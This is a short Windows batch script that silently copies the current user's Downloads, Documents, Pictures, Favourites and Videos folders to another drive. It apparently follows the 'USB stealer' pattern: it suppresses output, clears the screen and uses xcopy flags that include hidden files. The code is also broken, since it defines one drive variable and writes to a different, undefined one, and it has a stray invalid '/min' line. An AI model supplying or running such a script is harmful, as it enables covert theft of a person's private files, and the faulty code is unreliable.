@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\Downloads" "%drive%\all\S Downloads"
%backupcmd% "%USERPROFILE%\Documents" "%drive%\all\S Documents"
%backupcmd% "%USERPROFILE%\Pictures" "%drive%\all\S Pictures"
%backupcmd% "%USERPROFILE%\Favourites" "%drive%\all\S Favourites"
%backupcmd% "%USERPROFILE%\Videos" "%drive%\all\S Videos"
@echo off
cls